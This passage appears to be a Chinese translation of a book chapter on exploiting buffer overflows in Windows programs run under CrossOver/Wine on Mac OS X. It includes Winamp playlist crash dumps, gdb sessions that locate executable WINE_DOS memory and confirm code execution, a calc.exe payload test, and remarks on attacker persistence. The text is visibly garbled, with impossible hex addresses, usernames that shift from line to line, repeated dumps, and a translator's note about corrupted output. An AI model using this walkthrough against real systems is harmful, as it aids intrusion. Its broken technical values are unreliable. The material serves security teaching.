
## 进程列表示例

| PID | 进程名称 | 用户 | CPU | Thr | 大小 | VSSize | 类型 |
|---|---|---|---|---|---|---|---|
| 1603 | Activity Monitor | kfinitree | 5.6 | 14 | 79.64 MB | 887.64 MB | Intel |
| 1742 | | kfinitree | 1.4 | 5 | 14.27 MB | 831.21 MB | Intel |
| 1748 | bash | kfinitree | 0.0 | 1 | 932.00 KB | 586.18 MB | Intel |
| 1774 | SyncServer | kfinitree | 0.0 | 2 | 3.73 MB | 597.95 MB | Intel |
| 1778 | vuln | kfinitree | 0.0 | 2 | 2.17 MB | 619.36 MB | PowerPC |
| 1779 | gdb-powerpc-app | kfinitree | 0.0 | 2 | 8.77 MB | 675.41 MB | PowerPC |
| 1789 | Grab | kfinitree | 8.4 | 3 | 9.18 MB | 809.25 MB | Intel |

## 图 2.2 继续

![](img/792dbeecc8fbe4973ef2b3a6427b61de_51_0.png)

| PID | 进程名称 | 用户 | CPU | Thr | 大小 | VSSize | 类型 |
|---|---|---|---|---|---|---|---|
| 25 | loginwindow | kfinister | 0.3 | 3 | 29.91 MB | 762.69 MB | Intel |
| 113 | launch | kfinister | 0.0 | 3 | 528.00 KB | 585.73 MB | Intel |
| 162 | Spotlight | kfinister | 0.0 | 6 | 7.44 MB | 854.37 MB | Intel |
| 163 | UserAgent | kfinister | 0.0 | 2 | 2.06 MB | 717.05 MB | Intel |
| 164 | pboard | kfinister | 0.0 | 1 | 528.00 KB | 586.63 MB | Intel |
| 166 | Dock | kfinister | 0.1 | 3 | 14.86 MB | 802.98 MB | Intel |
| 167 | SystemUser | kfinister | 0.0 | 7 | 9.16 MB | 784.57 MB | Intel |
| 168 | Finder | kfinister | 0.0 | 8 | 39.61 MB | 642.23 MB | Intel |
| 169 | ATSServer | kfinister | 0.0 | 2 | 5.57 MB | 632.93 MB | Intel |
| 176 | iTunes Helper | kfinister | 0.0 | 2 | 2.39 MB | 730.94 MB | Intel |
| 171 | AirPort Base Station | kfinister | 0.0 | 3 | 3.10 MB | 747.41 MB | Intel |
| 182 | CrossOver HD | kfinister | 0.0 | 1 | 2.47 MB | 726.05 MB | Intel |
| 285 | Apple. | kfinister | 0.0 | 1 | 5.64 MB | 601.72 MB | Intel |
| 1118 | Terminal | kfinister | 0.0 | 4 | 13.11 MB | 791.65 MB | Intel |
| 1420 | bash | kfinister | 0.0 | 1 | 1000.00 KB | 586.18 MB | Intel |
| 1529 | mdworker | kfinister | 0.0 | 5 | 5.16 MB | 620.55 MB | Intel |
| 1603 | iTunes | kfinister | 0.1 | 9 | 78.36 MB | 831.23 MB | Intel |
| 1742 | Activity Monitor | kfinister | 1.1 | 5 | 14.39 MB | 831.46 MB | Intel |
| 1748 | bash | kfinister | 0.0 | 1 | 932.00 KB | 586.18 MB | Intel |
| 1774 | SyncServer | kfinister | 0.0 | 2 | 3.73 MB | 597.95 MB | Intel |
| 1778 | ssh | kfinister | 0.0 | 1 | 692.00 KB | 586.11 MB | Intel |
| 1779 | gdb-powerpc-app | kfinister | 0.1 | 3 | 13.05 MB | 679.76 MB | PowerPC |
| 1789 | Grab | kfinister | 5.5 | 9 | 18.84 MB | 856.00 MB | Intel |

## CrossOver Office 漏洞分析

`CrossOver Office` 是一个广受欢迎的 OSX 模拟器。通常情况下，它用于在多个替代平台上运行基于 Windows 的程序。由于 Apple 运行在 Intel 平台上，因此 Macintosh 也可以包含在可以运行 CrossOver 的操作系统列表中。在 CrossOver（即 wine）中运行的 Windows 应用程序中的缓冲区溢出会对宿主机操作系统产生负面影响。下面你可以看到溢出时的样子：

### 漏洞演示：vuln.exe

```
C:\vuln AAAAAAAAAAAAAAAAABBBCCCC
wine: Unhandled page fault on execute access to 0x43433433 at address 0x43433433 (thread 0019), starting debugging...
Unhandled exception: page fault on execute access to 0x43433433 in 32-bit code (0x43433433).
```

```
Register dump:
CS:0017 SS:001f DS:001f FS:1007 GS:0037
EIP:43433433 ESP:0061fe60 EAX:42424242 EFLAGS:(00-- -RI1)
EAX:00000000 EBX:00040000 ECX:0061fe60 EDX:00000000
ESI:00401220 EDI:7fffd000
Stack dump:
0x0061fe60 00110300 00001fa0 00121980 0x4012d4
0x0061ff00 0061ff20 00004000 0061ff48 004011ca
0x0061ff10 00000010 00000000 0061ff48 004011e7
0x0061ff20 00000002 00110390 00121980 fffffffff
0x0061ff30 0061ff40 00401220 0061ff58 00126de8
0x0061ff40 00000000 7b85df3c 0061ff58 00401238
0200: sel=0x107 base=7fffd000 limit=0000ffff 32-bit rw-
Backtrace:
0x43433433 -- no code
Modules:
Module Address Debug Info Name (3 modules)
PE 400000-406000 Deferred vuln
PE 7b811000-7b87c00 Deferred kernel32
PE 7bc10000-7bc1400 Deferred ntdll
Threads:
process tid prio (all:s are in hex)
0000001b (D) C:\\vuln.exe
00000019 <==
00000009
```

从外观上看，CrossOver 下的溢出与标准的 Windows 溢出一样。内存似乎像往常一样被覆盖，并在栈上进行了设置。与其使用示例来演示工作原理，我将使用 Winamp 的一个旧漏洞来解析列表，其输出是类似的，但比示例更详细。Winamp 有多个 DLL，因此内存布局比我们的示例稍微复杂。

### 漏洞演示：Winamp

```
C:\program files\winamp\wine: Unhandled page fault on read access to 0x43423141 at address 0x7b3cba8 (thread 0023), starting debugger...Unhandled exception: page fault on read access to 0x43423141 in 32-bit code (0x7b3cba8).
Register dump:
CS:0017 SS:001f DS:001f FS:1007 GS:0037
EIP:7b3cba8 ESP:0061fe60 EAX:42424242 EFLAGS:(00-- -RI1)
EAX:00000000 EBX:00040000 ECX:0061fe60 EDX:00000000
ESI:00401220 EDI:7fffd000
Stack dump:
0x0061fe60 00110300 00001fa0 00121980 0x4012d4
0x0061ff00 0061ff20 00004000 0061ff48 004011ca
0x0061ff10 00000010 00000000 0061ff48 004011e7
0x0061ff20 00000002 00110390 00121980 fffffffff
0x0061ff30 0061ff40 00401220 0061ff58 00126de8
0x0061ff40 00000000 7b85df3c 0061ff58 00401238
0200: sel=0x107 base=7fffd000 limit=0000ffff 32-bit rw-
Backtrace:
0x7b3cba8 in kernel32 (+0x2cba8)
0x7b3ddf52 in kernel32 (+0xdf52)
0x7bc21cc
0x7bc22fc (0x7a8)
0x7bc4a7 (0x7e)
```

使用 `ps` 命令，我们可以获取进程 ID 并将其附加到进程。一旦启动了调试器、加载了恶意文件并附加到进程，我们就可以看到它是如何工作的。与其依赖 wine 调试器的输出，不如通过 `gdb` 附加到进程。与 CrossOver 开发者提供的通用堆栈转储相比，`gdb` 界面让我们对所看到的内容有更多的控制。

一旦附加后，我们可以允许进程继续运行，随后看到它崩溃。

### 内存分析与 Shellcode 验证

总而言，一切看起来都非常标准。这是一个直接的 `EIP` 攻击，看起来我们有一个可以放置 shellcode 的合理位置。

```
(gdb) x/10s $esp+298
0x33de56:   'A' <repeats 200 times>...
0x33lde3:   'A' <repeats 200 times>...
0x33de66:   'A' <repeats 200 times>...
0x33eeae:   'A' <repeats 200 times>...
0x33ef76:   'A' <repeats 200 times>...
0x33f03e:   'A' <repeats 22 times>
```

该 shellcode 目前被放置在一个未受 Leopard 内存实现保护的内存位置，并且实际上它是完全随机的。此外，我们可以在内存中一个具有执行状态的静态位置找到 shellcode。OSX `vmap` 工具将此段内存显示为 `WINE_DOS`。

```
localhost:leopard_stubs kifminster$ vmap 664 | grep 0033f
WINE_DOS   0033e000-0033f000 [ 4K] rw/rwx SM-PRV
/Applications/CrossOver.app/Contents/SharedSupport/CrossOver/bin/winelader
WINE_DOS   0033f000-00340000 [ 4K] rw/rwx SM-COW
/Applications/CrossOver.app/Contents/SharedSupport/CrossOver/bin/winelader
```

由于内存中已经有多个 `0x41` 字符，且知道它们将作为 `NOP`，我们可以快速检查 `WINE_DOS` 内存的可用性。通过使用 `gdb` 将 `EIP` 指向我们确定的内存位置，我们能够验证代码执行。根据这个测试用例，我们假设这段内存可以用于恶意代码的执行。

```
(gdb) break *0x33lde11
Breakpoint 1 at 0x33lde11
(gdb) set $eip=0x33lde11
(gdb) 
(gdb) c
Continuing.
```

通过在断点处并在单步执行每条指令，我们完全验证了我们的假设。

```
Breakpoint 1, 0x033lde11 in ?? ()
(gdb) si
0x033lde12 in ?? ()
(gdb) 
0x033lde13 in ?? ()
```

```
(gdb)
0x0033ed14 in ?? ()
(gdb)
0x0033ed15 in ?? ()
(gdb)
0x0033ed16 in ?? ()
(gdb)
0x0033ed17 in ?? ()
```

这个漏洞利用示例的奇怪之处在于，我们最终放置在内存中的 shellcode 是面向 Windows 的，而不是为 OSX 设计的。`WINE_DOS` 内存类型并没有为了运行 OSX 可执行代码而设置，因此我们可能希望使用一个标准的 Win32 载荷。

在初步测试之后，我稍微更改了我的 Wine 环境。我从使用 Windows98 容器（wine bottle）切换到了 Windows XP 容器。实际上，与静态内存位置或 `WIN_DOS` 段相比并没有太大区别，内存从基地址 `0x0033ec00` 移动到了 `0x0033ff00`。

```
0x33ff90: "?????", '?' <repeats 194 times>>
0x3340058: '?' <repeats 200 times>...
```

一旦添加了 `calc.exe` 载荷并正确构造了播放列表，测试便启动。

```
1192 ttys002 0:00.19
/Applications/CrossOver.app/Contents/SharedSupport/CrossOver/bin/wineloader
winewrapper.exe CrossOver --run -- cmd
1195 ttys002 0:01.64
/Applications/CrossOver.app/Contents/SharedSupport/CrossOver/lib/.../bin/
wineloader cmd
```

```
1198 ttys02 0:01.49
/Applications/CrossOver.app/Contents/SharedSupport/CrossOver/lib/.../bin/wineloader winamp
localhost:book finisterse xxd 0d0a 5470 549c [playlist].Titl
0000000: 5b70 6c61 796c 6973 745d 0d0a 4578 706c f69e el Exploi
0000010: 7420 6279 2055 6d65 616d 7020 4578 706c 6f67
0000020: 7420 6279 2055 6d65 7368 0d0a 4c65 6e67 t by Umesh...
```

> （注：此处原文中似乎存在乱码或混淆的文本，根据指令要求保留代码块不翻译，但此处看起来更像是损坏的日志输出，故按原样保留）

### 目录遍历与持久化演示

```
Directory of y:\
1/9/2008      8:16 PM            116,769 .bash_history
2/13/2007     7:58 PM                3 .negativemanuer
9/10/2007     2:46 PM    <DIR> .config
1/9/2008      7:26 PM               12,292 .DS_Store
10/31/2007    9:29 AM                508 .profile
11/4/2007     9:43 AM    <DIR> .Spotlight-V100
11/4/2007     9:43 AM    <DIR> .Trashes
1/7/2008      6:17 PM    <DIR> Applications
1/9/2008      8:15 PM    <DIR> Desktop
```

此时，系统被攻破后发生的一切事情将仅限于攻击者的想象力。例如，在某些情况下，对于攻击者来说，能够以持久的方式随意访问系统是有利的。我们将使用一个名为 `iAdware` 的简单非恶意新奇应用程序来演示攻击者如何在系统中保持持久化。我们并不会精确地植入后门，但仅仅一个广告软件带来的头疼就足以说明问题了。

通过短时间的研究，你一定会发现 OSX 中提供的某些功能非常利于促进恶意软件的成功。在 Windows 世界中，蠕虫通常会使用命名的互斥锁（mutex）来确保不会有多个蠕虫实例运行。在 OSX 上，我们可以用同样利用共享内存。
